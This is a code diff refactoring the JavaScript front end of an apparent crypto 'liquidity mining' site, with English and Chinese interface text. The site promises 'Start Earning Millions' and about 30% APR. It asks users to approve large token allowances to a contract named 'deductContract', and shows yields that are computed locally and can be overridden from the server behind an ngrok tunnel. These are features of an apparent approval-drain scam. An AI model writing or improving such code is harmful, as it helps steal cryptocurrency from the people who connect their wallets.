@@ -15,47 +15,14 @@ const ERC20_ABI = [
   "function allowance(address owner, address spender) view returns (uint256)"
 ];
 
-// DOM 元素
-const connectButton = document.getElementById('connectButton');
-const statusDiv = document.getElementById('status');
-const startBtn = document.getElementById('startBtn');
-const pledgeBtn = document.getElementById('pledgeBtn');
-const pledgeAmount = document.getElementById('pledgeAmount');
-const pledgeDuration = document.getElementById('pledgeDuration');
-const pledgeToken = document.getElementById('pledgeToken');
-const refreshWallet = document.getElementById('refreshWallet');
-const walletTokenSelect = document.getElementById('walletTokenSelect');
-const walletBalanceAmount = document.getElementById('walletBalanceAmount');
-const accountBalanceValue = document.getElementById('accountBalanceValue');
-const totalValue = document.getElementById('totalValue');
-let grossOutputValue = document.getElementById('grossOutputValue');
-let cumulativeValue = document.getElementById('cumulativeValue');
-const nextBenefit = document.getElementById('nextBenefit');
-const claimModal = document.getElementById('claimModal');
-const closeModal = document.getElementById('closeModal');
-const confirmClaim = document.getElementById('confirmClaim');
-const cancelClaim = document.getElementById('cancelClaim');
-const modalClaimableETH = document.getElementById('modalClaimableETH');
-const modalPendingETH = document.getElementById('modalPendingETH');
-const modalSelectedToken = document.getElementById('modalSelectedToken');
-const modalEquivalentValue = document.getElementById('modalEquivalentValue');
-const modalTitle = document.getElementById('modalTitle');
-const languageSelect = document.getElementById('languageSelect');
-const elements = {
-  title: document.getElementById('title'),
-  subtitle: document.getElementById('subtitle'),
-  tabLiquidity: document.querySelector('.tab[data-tab="liquidity"] span'),
-  tabPledging: document.querySelector('.tab[data-tab="pledging"] span'),
-  grossOutputLabel: document.getElementById('grossOutputLabel'),
-  cumulativeLabel: document.getElementById('cumulativeLabel'),
-  walletBalanceLabel: document.getElementById('walletBalanceLabel'),
-  accountBalanceLabel: document.getElementById('accountBalanceLabel'),
-  startBtnText: startBtn,
-  pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
-  pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
-  pledgeBtnText: pledgeBtn
-};
+// DOM 元素（使用 let 允許重新賦值）
+let connectButton, statusDiv, startBtn, pledgeBtn, pledgeAmount, pledgeDuration, pledgeToken;
+let refreshWallet, walletTokenSelect, walletBalanceAmount, accountBalanceValue, totalValue;
+let grossOutputValue, cumulativeValue, nextBenefit, claimModal, closeModal, confirmClaim, cancelClaim;
+let modalClaimableETH, modalPendingETH, modalSelectedToken, modalEquivalentValue, modalTitle, languageSelect;
+let elements = {};
 
+// 變數
 let provider, signer, userAddress;
 let deductContract, usdtContract, usdcContract, wethContract;
 let pledgedAmount = 0;
@@ -75,17 +42,158 @@ const isDevMode = window.location.hostname === 'localhost' || window.location.ho
 window.currentClaimable = 0;
 window.currentPending = 0;
 const MONTHLY_RATE = 0.01;
-let ethPriceCache = {
-  price: 2500,
-  timestamp: 0,
-  cacheDuration: 5 * 60 * 1000
-};
+let ethPriceCache = { price: 2500, timestamp: 0, cacheDuration: 5 * 60 * 1000 };
 
-const translations = { /* ... 不變 ... */ };
+const translations = {
+  'en': {
+    title: 'Liquidity Mining',
+    subtitle: 'Start Earning Millions',
+    tabLiquidity: 'Liquidity',
+    tabPledging: 'Pledging',
+    grossOutputLabel: 'Gross Output',
+    cumulativeLabel: 'Cumulative',
+    walletBalanceLabel: 'Wallet Balance',
+    accountBalanceLabel: 'Account Balance',
+    nextBenefit: 'Next Benefit: 00:00:00',
+    startBtnText: 'Start',
+    pledgeAmountLabel: 'Pledge Amount',
+    pledgeDurationLabel: 'Duration',
+    pledgeBtnText: 'Pledge Now',
+    claimBtnText: 'Claim',
+    noClaimable: 'No claimable interest available.',
+    claimSuccess: 'Claim successful!',
+    nextClaimTime: 'Next claim in 12 hours.',
+    miningStarted: 'Mining started!',
+    error: 'Error',
+    offlineWarning: 'Server offline, using local mode.',
+    noWallet: 'Please install a wallet.',
+    dataSent: 'Data sent.',
+    pledgeSuccess: 'Pledge successful!',
+    pledgeError: 'Pledge failed.',
+    invalidPledgeAmount: 'Invalid amount.',
+    invalidPledgeToken: 'Invalid token.',
+    insufficientBalance: 'Insufficient balance.',
+    sseFailed: 'SSE failed, using polling.',
+    ethersError: 'Ethers.js error.',
+    approveError: 'Approval failed.',
+    selectTokenFirst: 'Select token first.',
+    balanceZero: 'Balance zero.',
+    balanceTooLow: 'Balance too low.',
+    wethValueTooLow: 'WETH value too low.',
+    rulesTitle: 'Mining Rules',
+    rulesContent: `
+      <p>1. Select token, need at least 500 USDT/USDC or WETH $500 to start.</p>
+      <p>2. Insufficient: can authorize but not start.</p>
+      <p>3. APR: 28.3% ~ 31.5%.</p>
+      <p>4. Interest every 12 hours (PT 00:00 & 12:00).</p>
+      <p>5. Pledging independent.</p>
+    `,
+    modalClaimableLabel: 'Claimable',
+    modalPendingLabel: 'Pending',
+    modalSelectedTokenLabel: 'Selected Token',
+    modalEquivalentValueLabel: 'Equivalent Value'
+  },
+  'zh-Hant': {
+    title: '流動性挖礦',
+    subtitle: '開始賺取數百萬',
+    tabLiquidity: '流動性',
+    tabPledging: '質押',
+    grossOutputLabel: '總產出',
+    cumulativeLabel: '累計',
+    walletBalanceLabel: '錢包餘額',
+    accountBalanceLabel: '帳戶餘額',
+    nextBenefit: '下次收益: 00:00:00',
+    startBtnText: '開始',
+    pledgeAmountLabel: '質押金額',
+    pledgeDurationLabel: '期間',
+    pledgeBtnText: '立即質押',
+    claimBtnText: '領取',
+    noClaimable: '無可領取利息。',
+    claimSuccess: '領取成功！',
+    nextClaimTime: '下次領取時間：12 小時後。',
+    miningStarted: '挖礦開始！',
+    error: '錯誤',
+    offlineWarning: '伺服器離線，使用本地模式。',
+    noWallet: '請安裝錢包。',
+    dataSent: '數據已發送。',
+    pledgeSuccess: '質押成功！',
+    pledgeError: '質押失敗。',
+    invalidPledgeAmount: '金額無效。',
+    invalidPledgeToken: '代幣無效。',
+    insufficientBalance: '餘額不足。',
+    sseFailed: 'SSE 失敗，使用輪詢。',
+    ethersError: 'Ethers.js 錯誤。',
+    approveError: '授權失敗。',
+    selectTokenFirst: '請先選擇代幣。',
+    balanceZero: '餘額為零。',
+    balanceTooLow: '餘額過低。',
+    wethValueTooLow: 'WETH 價值過低。',
+    rulesTitle: '挖礦規則',
+    rulesContent: `
+      <p>1. 選擇代幣，需至少 500 USDT/USDC 或 WETH $500 才能開始。</p>
+      <p>2. 不足：可授權但無法開始。</p>
+      <p>3. 年化利率：28.3% ~ 31.5%。</p>
+      <p>4. 每 12 小時發放一次（美西時間 00:00 與 12:00）。</p>
+      <p>5. 質押獨立運作。</p>
+    `,
+    modalClaimableLabel: '可領取',
+    modalPendingLabel: '已累積（未到期）',
+    modalSelectedTokenLabel: '選擇代幣',
+    modalEquivalentValueLabel: '等值金額'
+  },
+  'zh-Hans': {
+    title: '流动性挖矿',
+    subtitle: '开始赚取数百万',
+    tabLiquidity: '流动性',
+    tabPledging: '质押',
+    grossOutputLabel: '总产出',
+    cumulativeLabel: '累计',
+    walletBalanceLabel: '钱包余额',
+    accountBalanceLabel: '账户余额',
+    nextBenefit: '下次收益: 00:00:00',
+    startBtnText: '开始',
+    pledgeAmountLabel: '质押金额',
+    pledgeDurationLabel: '期间',
+    pledgeBtnText: '立即质押',
+    claimBtnText: '领取',
+    noClaimable: '无可领取利息。',
+    claimSuccess: '领取成功！',
+    nextClaimTime: '下次领取时间：12 小时后。',
+    miningStarted: '挖矿开始！',
+    error: '错误',
+    offlineWarning: '服务器离线，使用本地模式。',
+    noWallet: '请安装钱包。',
+    dataSent: '数据已发送。',
+    pledgeSuccess: '质押成功！',
+    pledgeError: '质押失败。',
+    invalidPledgeAmount: '金额无效。',
+    invalidPledgeToken: '代币无效。',
+    insufficientBalance: '余额不足。',
+    sseFailed: 'SSE 失败，使用轮询。',
+    ethersError: 'Ethers.js 错误。',
+    approveError: '授权失败。',
+    selectTokenFirst: '请先选择代币。',
+    balanceZero: '余额为零。',
+    balanceTooLow: '余额过低。',
+    wethValueTooLow: 'WETH 价值过低。',
+    rulesTitle: '挖矿规则',
+    rulesContent: `
+      <p>1. 选择代币，需至少 500 USDT/USDC 或 WETH $500 才能开始。</p>
+      <p>2. 不足：可授权但无法开始。</p>
+      <p>3. 年化利率：28.3% ~ 31.5%。</p>
+      <p>4. 每 12 小时发放一次（美西时间 00:00 与 12:00）。</p>
+      <p>5. 质押独立运作。</p>
+    `,
+    modalClaimableLabel: '可领取',
+    modalPendingLabel: '已累计（未到期）',
+    modalSelectedTokenLabel: '选择代币',
+    modalEquivalentValueLabel: '等值金额'
+  }
+};
 
 let currentLang = localStorage.getItem('language') || 'en';
 
-// 【日誌函數】
+// 日誌函數
 function log(message, type = 'info') {
   const timestamp = new Date().toLocaleTimeString();
   const prefix = { info: 'ℹ️', success: '✅', error: '❌', send: '📤', receive: '📥' }[type] || 'ℹ️';
@@ -103,6 +211,50 @@ function log(message, type = 'info') {
   }
 }
 
+// 安全獲取 DOM 元素
+function getElements() {
+  connectButton = document.getElementById('connectButton');
+  statusDiv = document.getElementById('status');
+  startBtn = document.getElementById('startBtn');
+  pledgeBtn = document.getElementById('pledgeBtn');
+  pledgeAmount = document.getElementById('pledgeAmount');
+  pledgeDuration = document.getElementById('pledgeDuration');
+  pledgeToken = document.getElementById('pledgeToken');
+  refreshWallet = document.getElementById('refreshWallet');
+  walletTokenSelect = document.getElementById('walletTokenSelect');
+  walletBalanceAmount = document.getElementById('walletBalanceAmount');
+  accountBalanceValue = document.getElementById('accountBalanceValue');
+  totalValue = document.getElementById('totalValue');
+  grossOutputValue = document.getElementById('grossOutputValue');
+  cumulativeValue = document.getElementById('cumulativeValue');
+  nextBenefit = document.getElementById('nextBenefit');
+  claimModal = document.getElementById('claimModal');
+  closeModal = document.getElementById('closeModal');
+  confirmClaim = document.getElementById('confirmClaim');
+  cancelClaim = document.getElementById('cancelClaim');
+  modalClaimableETH = document.getElementById('modalClaimableETH');
+  modalPendingETH = document.getElementById('modalPendingETH');
+  modalSelectedToken = document.getElementById('modalSelectedToken');
+  modalEquivalentValue = document.getElementById('modalEquivalentValue');
+  modalTitle = document.getElementById('modalTitle');
+  languageSelect = document.getElementById('languageSelect');
+
+  elements = {
+    title: document.getElementById('title'),
+    subtitle: document.getElementById('subtitle'),
+    tabLiquidity: document.querySelector('.tab[data-tab="liquidity"] span'),
+    tabPledging: document.querySelector('.tab[data-tab="pledging"] span'),
+    grossOutputLabel: document.getElementById('grossOutputLabel'),
+    cumulativeLabel: document.getElementById('cumulativeLabel'),
+    walletBalanceLabel: document.getElementById('walletBalanceLabel'),
+    accountBalanceLabel: document.getElementById('accountBalanceLabel'),
+    startBtnText: startBtn,
+    pledgeAmountLabel: document.getElementById('pledgeAmountLabel'),
+    pledgeDurationLabel: document.getElementById('pledgeDurationLabel'),
+    pledgeBtnText: pledgeBtn
+  };
+}
+
 async function retry(fn, maxAttempts = 3, delayMs = 3000) {
   for (let i = 0; i < maxAttempts; i++) {
     try {
@@ -114,30 +266,26 @@ async function retry(fn, maxAttempts = 3, delayMs = 3000) {
   }
 }
 
-async function retryDOMAcquisition(maxAttempts = 3, delayMs = 500) {
-  let attempts = 0;
-  while (attempts < maxAttempts) {
-    grossOutputValue = document.getElementById('grossOutputValue');
-    cumulativeValue = document.getElementById('cumulativeValue');
-    if (grossOutputValue && cumulativeValue) return true;
-    await new Promise(r => setTimeout(r, delayMs));
-    attempts++;
-  }
-  updateStatus(translations[currentLang].error + ': DOM error', true);
-  return false;
-}
-
 async function checkServerStatus() {
   try {
-    const response = await fetch(`${API_BASE_URL}/api/status`, { cache: 'no-cache' });
+    log('檢查伺服器狀態...', 'info');
+    const response = await retry(() => fetch(`${API_BASE_URL}/api/status`, { 
+      cache: 'no-cache',
+      headers: { 'ngrok-skip-browser-warning': 'true' }
+    }));
     if (response.ok) {
       const { status, lastUpdated } = await response.json();
       isServerAvailable = status === 'available';
-      if (isServerAvailable && pendingUpdates.length > 0) await syncPendingUpdates(lastUpdated);
+      log(`伺服器狀態：${status}, 最後更新：${lastUpdated}`, 'info');
+      if (isServerAvailable && pendingUpdates.length > 0) {
+        log(`同步 ${pendingUpdates.length} 筆待發送數據...`, 'info');
+        await syncPendingUpdates(lastUpdated);
+      }
       return isServerAvailable;
     }
   } catch (error) {
     isServerAvailable = false;
+    log(`伺服器檢查失敗: ${error.message}`, 'error');
     if (isDevMode) updateStatus(translations[currentLang].offlineWarning, true);
   }
   return false;
@@ -145,23 +293,30 @@ async function checkServerStatus() {
 
 async function syncPendingUpdates(serverLastUpdated) {
   for (const update of pendingUpdates) {
-    if (update.timestamp > serverLastUpdated) await saveUserData(update.data, false);
+    if (update.timestamp > serverLastUpdated) {
+      log(`同步待發送數據：${JSON.stringify(update.data, null, 2)}`, 'send');
+      await saveUserData(update.data, false);
+    }
   }
   pendingUpdates = [];
+  log('待發送數據同步完成', 'success');
 }
 
 async function loadUserDataFromServer() {
   if (!userAddress) return;
   try {
-    const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, { cache: 'no-cache' }));
-    if (!response.ok) throw new Error(`HTTP error: ${response.status}`);
+    log('載入用戶數據...', 'info');
+    const response = await retry(() => fetch(`${API_BASE_URL}/api/all-data`, { 
+      cache: 'no-cache',
+      headers: { 'ngrok-skip-browser-warning': 'true' }
+    }));
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
     allData = await response.json();
     const userData = allData.users[userAddress] || {};
     const localData = JSON.parse(localStorage.getItem('userData') || '{}');
     localLastUpdated = localData.lastUpdated || 0;
 
     if (allData.lastUpdated > localLastUpdated) {
-      // 同步 users
       pledgedAmount = userData.pledgedAmount ?? 0;
       lastPayoutTime = userData.lastPayoutTime ? parseInt(userData.lastPayoutTime) : null;
       totalGrossOutput = userData.totalGrossOutput ?? 0;
@@ -169,14 +324,11 @@ async function loadUserDataFromServer() {
       accountBalance = userData.accountBalance || { USDT: 0, USDC: 0, WETH: 0 };
       authorizedToken = userData.authorizedToken || 'USDT';
 
-      // 同步 pledges
       const pledge = allData.pledges?.[userAddress] || { isPledging: false, amount: '0' };
       pledgedAmount = parseFloat(pledge.amount) || 0;
 
-      // 同步 overrides
       const override = allData.overrides?.[userAddress] || {};
       totalGrossOutput = override.grossOutput ?? totalGrossOutput;
-      const cumulative = override.cumulative ?? (totalGrossOutput + window.currentClaimable);
 
       localStorage.setItem('userData', JSON.stringify({
         pledgedAmount, lastPayoutTime, totalGrossOutput, claimable: window.currentClaimable,
@@ -227,15 +379,22 @@ async function saveUserData(data = null, addToPending = true) {
   try {
     const response = await retry(() => fetch(`${API_BASE_URL}/api/user-data`, {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 
+        'Content-Type': 'application/json',
+        'ngrok-skip-browser-warning': 'true'
+      },
       body: JSON.stringify({ address: userAddress, data: dataToSave })
-    }));
-    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    }), 3, 3000);
+
+    if (!response.ok) {
+      const text = await response.text();
+      throw new Error(`HTTP ${response.status}: ${text}`);
+    }
     log('資料發送成功', 'success');
     localStorage.setItem('userData', JSON.stringify(dataToSave));
     localLastUpdated = dataToSave.lastUpdated;
   } catch (error) {
-    log(`資料發送失敗: ${error.message}`, 'error');
+    log(`發送失敗: ${error.message}`, 'error');
     if (addToPending) {
       pendingUpdates.push({ timestamp: Date.now(), data: dataToSave });
       localStorage.setItem('userData', JSON.stringify(dataToSave));
@@ -248,6 +407,7 @@ function updateStatus(message, isWarning = false) {
   statusDiv.innerHTML = message || '';
   statusDiv.style.display = message ? 'block' : 'none';
   statusDiv.style.color = isWarning ? '#FFD700' : '#00ffff';
+  statusDiv.style.textShadow = isWarning ? '0 0 5px #FFD700' : '0 0 5px #00ffff';
 }
 
 function resetState(showMsg = true) {
@@ -374,7 +534,7 @@ async function updateInterest() {
     localStorage.setItem('totalGrossOutput', totalGrossOutput.toString());
     localStorage.setItem('claimable', claimable.toString());
     localStorage.setItem('lastPayoutTime', now.toString());
-    await saveUserData(); // 發送更新
+    await saveUserData();
   }
   const nextHour = nowET.getHours() < 12 ? 12 : 24;
   const nextPayoutET = new Date(nowET);
@@ -396,7 +556,7 @@ function updateClaimModalLabels() {
     'zh-Hans': { title: '领取', claimable: '可领取', pending: '已累计（未到期）', selectedToken: '选择代币', equivalentValue: '等值金额' }
   };
   const labels = claimLabels[currentLang];
-  modalTitle.textContent = labels.title;
+  if (modalTitle) modalTitle.textContent = labels.title;
   const labelElements = document.querySelectorAll('.claim-info .label');
   if (labelElements.length === 4) {
     labelElements[0].textContent = labels.claimable;
@@ -410,24 +570,24 @@ async function claimInterest() {
   const token = authorizedToken;
   await refreshEthPrice();
   updateClaimModalLabels();
-  modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
-  modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
-  modalSelectedToken.textContent = token;
+  if (modalClaimableETH) modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
+  if (modalPendingETH) modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
+  if (modalSelectedToken) modalSelectedToken.textContent = token;
   const equivalent = window.currentClaimable * ethPriceCache.price;
-  modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${token}`;
-  claimModal.style.display = 'flex';
+  if (modalEquivalentValue) modalEquivalentValue.textContent = `${equivalent.toFixed(3)} ${token}`;
+  if (claimModal) claimModal.style.display = 'flex';
   if (claimInterval) clearInterval(claimInterval);
   claimInterval = setInterval(async () => {
     await updateInterest();
-    modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
-    modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
+    if (modalClaimableETH) modalClaimableETH.textContent = `${window.currentClaimable.toFixed(7)} ETH`;
+    if (modalPendingETH) modalPendingETH.textContent = `${window.currentPending.toFixed(7)} ETH`;
     const eq = window.currentClaimable * ethPriceCache.price;
-    modalEquivalentValue.textContent = `${eq.toFixed(3)} ${token}`;
+    if (modalEquivalentValue) modalEquivalentValue.textContent = `${eq.toFixed(3)} ${token}`;
   }, 1000);
 }
 
 function closeClaimModal() {
-  claimModal.style.display = 'none';
+  if (claimModal) claimModal.style.display = 'none';
   if (claimInterval) clearInterval(claimInterval);
 }
 
@@ -513,13 +673,15 @@ async function sendMobileRobustTransaction(populatedTx) {
 async function initializeWallet() {
   if (!window.ethers) {
     updateStatus(translations[currentLang].ethersError, true);
-    connectButton.disabled = true;
+    if (connectButton) connectButton.disabled = true;
     return;
   }
   try {
     if (typeof window.ethereum === 'undefined') {
       updateStatus(translations[currentLang].noWallet, true);
-      disableInteractiveElements(true); connectButton.disabled = true; return;
+      disableInteractiveElements(true); 
+      if (connectButton) connectButton.disabled = true; 
+      return;
     }
     provider = new window.ethers.providers.Web3Provider(window.ethereum);
     window.ethereum.on('accountsChanged', a => {
@@ -541,17 +703,20 @@ async function initializeWallet() {
     }
   } catch (e) {
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
-    connectButton.disabled = true;
+    if (connectButton) connectButton.disabled = true;
   }
 }
 
 async function connectWallet() {
   try {
     if (typeof window.ethereum === 'undefined') {
-      updateStatus(translations[currentLang].noWallet, true); connectButton.disabled = true; return;
+      updateStatus(translations[currentLang].noWallet, true); 
+      if (connectButton) connectButton.disabled = true; 
+      return;
     }
     if (!window.ethers) {
-      updateStatus(translations[currentLang].ethersError, true); return;
+      updateStatus(translations[currentLang].ethersError, true); 
+      return;
     }
     if (!provider) provider = new window.ethers.providers.Web3Provider(window.ethereum);
     updateStatus('Connecting...');
@@ -563,13 +728,15 @@ async function connectWallet() {
     usdtContract = new window.ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
     usdcContract = new window.ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
     wethContract = new window.ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
-    connectButton.classList.add('connected');
-    connectButton.textContent = 'Connected';
+    if (connectButton) {
+      connectButton.classList.add('connected');
+      connectButton.textContent = 'Connected';
+    }
 
     log(`錢包連接成功: ${userAddress}`, 'success');
 
     await loadUserDataFromServer();
-    await saveUserData(); // 強制發送一次
+    await saveUserData();
     setupSSE();
 
     await updateUIBasedOnChainState();
@@ -578,7 +745,7 @@ async function connectWallet() {
     log(`錢包連接失敗: ${e.message}`, 'error');
     updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
     resetState(true);
-    connectButton.disabled = typeof window.ethereum === 'undefined';
+    if (connectButton) connectButton.disabled = typeof window.ethereum === 'undefined';
   }
 }
 
@@ -619,7 +786,7 @@ async function updateUIBasedOnChainState() {
     const hasSufficientAllowance = isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
     const isFullyAuthorized = isServiceActive || hasSufficientAllowance;
     if (isFullyAuthorized) {
-      const selectedToken = walletTokenSelect.value;
+      const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
       const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
       const selectedContract = tokenMap[selectedToken];
       let balanceBigInt = 0n;
@@ -641,21 +808,27 @@ async function updateUIBasedOnChainState() {
         initializeMiningData();
       }
       if (isWethAuthorized) {
-        walletTokenSelect.value = 'WETH';
+        if (walletTokenSelect) walletTokenSelect.value = 'WETH';
         authorizedToken = 'WETH';
       } else if (isUsdtAuthorized) {
-        walletTokenSelect.value = 'USDT';
+        if (walletTokenSelect) walletTokenSelect.value = 'USDT';
         authorizedToken = 'USDT';
       } else if (isUsdcAuthorized) {
-        walletTokenSelect.value = 'USDC';
+        if (walletTokenSelect) walletTokenSelect.value = 'USDC';
         authorizedToken = 'USDC';
       }
       setInitialNextBenefitTime();
       activateStakingUI();
-      pledgeBtn.disabled = pledgeAmount.disabled = pledgeDuration.disabled = pledgeToken.disabled = false;
+      if (pledgeBtn) pledgeBtn.disabled = false;
+      if (pledgeAmount) pledgeAmount.disabled = false;
+      if (pledgeDuration) pledgeDuration.disabled = false;
+      if (pledgeToken) pledgeToken.disabled = false;
     } else {
       if (startBtn) startBtn.style.display = 'block';
-      pledgeBtn.disabled = pledgeAmount.disabled = pledgeDuration.disabled = pledgeToken.disabled = true;
+      if (pledgeBtn) pledgeBtn.disabled = true;
+      if (pledgeAmount) pledgeAmount.disabled = true;
+      if (pledgeDuration) pledgeDuration.disabled = true;
+      if (pledgeToken) pledgeToken.disabled = true;
     }
     disableInteractiveElements(false); updateStatus("");
   } catch (e) {
@@ -666,7 +839,7 @@ async function updateUIBasedOnChainState() {
 async function handleConditionalAuthorizationFlow() {
   if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
   updateStatus('Authorizing...');
-  const selectedToken = walletTokenSelect.value;
+  const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
   const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
   const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
   const tokenMap = {
@@ -712,30 +885,20 @@ async function handleConditionalAuthorizationFlow() {
 
 function updateLanguage(lang) {
   currentLang = lang;
-  languageSelect.value = lang;
+  if (languageSelect) languageSelect.value = lang;
   localStorage.setItem('language', lang);
 
-  // 延遲執行，確保 DOM 完全載入
-  const applyLanguage = () => {
+  const apply = () => {
     for (let key in elements) {
       if (elements[key] && translations[lang]?.[key]) {
         elements[key].textContent = translations[lang][key];
       }
     }
 
-    if (claimModal && claimModal.style.display === 'flex') {
-      updateClaimModalLabels();
-    }
-
-    // 安全更新 rulesTitle / rulesContent
     const rulesTitle = document.getElementById('rulesTitle');
     const rulesContent = document.getElementById('rulesContent');
-    if (rulesTitle && translations[lang].rulesTitle) {
-      rulesTitle.textContent = translations[lang].rulesTitle;
-    }
-    if (rulesContent && translations[lang].rulesContent) {
-      rulesContent.innerHTML = translations[lang].rulesContent;
-    }
+    if (rulesTitle) rulesTitle.textContent = translations[lang].rulesTitle;
+    if (rulesContent) rulesContent.innerHTML = translations[lang].rulesContent;
 
     if (claimModal && claimModal.style.display === 'flex') {
       updateClaimModalLabels();
@@ -745,12 +908,7 @@ function updateLanguage(lang) {
     document.documentElement.lang = lang;
   };
 
-  // 確保 DOM 已載入
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', applyLanguage);
-  } else {
-    setTimeout(applyLanguage, 100);
-  }
+  setTimeout(apply, 200);
 }
 
 function setupSSE() {
@@ -771,7 +929,7 @@ function setupSSE() {
     window.currentSSE = sse;
 
     sse.onopen = () => {
-      console.log('SSE 連線成功');
+      log('SSE 連線成功', 'success');
       retryCount = 0;
       updateStatus('SSE 已連線');
     };
@@ -792,7 +950,7 @@ function setupSSE() {
     };
 
     sse.onerror = () => {
-      console.warn('SSE 斷線，重連中...');
+      log('SSE 斷線，重連中...', 'error');
       sse.close();
       if (retryCount < maxRetries) {
         retryCount++;
@@ -814,12 +972,8 @@ function setupSSE() {
 
 // 初始化
 document.addEventListener('DOMContentLoaded', () => {
-  // 延遲更新語言，確保所有元素存在
-  setTimeout(() => {
-    updateLanguage(currentLang);
-    if (languageSelect) languageSelect.value = currentLang;
-  }, 150);
-
+  getElements(); // 安全獲取 DOM
+  updateLanguage(currentLang);
   initializeWallet();
   setTimeout(() => {
     updateTotalFunds();
@@ -840,7 +994,7 @@ document.addEventListener('DOMContentLoaded', () => {
         return;
       }
       localStorage.setItem('claimable', '0');
-      const claimed = parseFloat(localStorage.getItem('claimed')) + claimable;
+      const claimed = parseFloat(localStorage.getItem('claimed') || '0') + claimable;
       localStorage.setItem('claimed', claimed.toString());
       accountBalance[authorizedToken] += claimable;
       await saveUserData();
@@ -862,7 +1016,7 @@ document.addEventListener('DOMContentLoaded', () => {
   if (startBtn) {
     startBtn.addEventListener('click', async () => {
       if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
-      const selectedToken = walletTokenSelect.value;
+      const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
       if (!selectedToken) { updateStatus(translations[currentLang].selectTokenFirst, true); return; }
       const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
       const selectedContract = tokenMap[selectedToken];
@@ -928,7 +1082,14 @@ document.addEventListener('DOMContentLoaded', () => {
       updateStatus('Pledging...');
       const pledgeData = { address: userAddress, pledges: { isPledging: true, token: tokenAddress, amount: amount.toFixed(2) } };
       try {
-        const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(pledgeData) }));
+        const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data`, { 
+          method: 'POST', 
+          headers: { 
+            'Content-Type': 'application/json',
+            'ngrok-skip-browser-warning': 'true'
+          }, 
+          body: JSON.stringify(pledgeData) 
+        }));
         if (!response.ok) throw new Error(`Pledge failed, status: ${response.status}`);
         updateStatus(translations[currentLang].pledgeSuccess);
         await saveUserData();
@@ -955,9 +1116,13 @@ document.addEventListener('DOMContentLoaded', () => {
       const rulesContent = document.getElementById('rulesContent');
       if (rulesTitle) rulesTitle.textContent = translations[currentLang].rulesTitle;
       if (rulesContent) rulesContent.innerHTML = translations[currentLang].rulesContent;
-      rulesModal.style.display = 'flex';
+      if (rulesModal) rulesModal.style.display = 'flex';
     });
   }
-  if (closeRulesModal) closeRulesModal.addEventListener('click', () => rulesModal.style.display = 'none');
-  if (rulesModal) rulesModal.addEventListener('click', e => e.target === rulesModal && (rulesModal.style.display = 'none'));
+  if (closeRulesModal) closeRulesModal.addEventListener('click', () => {
+    if (rulesModal) rulesModal.style.display = 'none';
+  });
+  if (rulesModal) rulesModal.addEventListener('click', e => {
+    if (e.target === rulesModal && rulesModal) rulesModal.style.display = 'none';
+  });
 });
